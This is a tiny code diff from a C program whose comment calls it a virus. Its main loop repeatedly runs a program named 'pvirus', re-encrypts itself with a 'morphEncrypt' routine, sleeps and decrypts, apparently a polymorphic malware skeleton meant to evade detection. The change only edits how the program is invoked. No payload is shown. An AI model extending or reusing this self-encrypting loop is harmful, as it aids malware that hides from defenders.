@@ -15,7 +15,7 @@ int main() {
 	/*Runs infintely running the virus, encoding, waiting 3 seconds, then decoding and
 	starting again*/
 	while (1) {
-		system("./pvirus");
+		system("pvirus");
 		int key = morphEncrypt();
 		sleep(3);
 		decrypt(key);
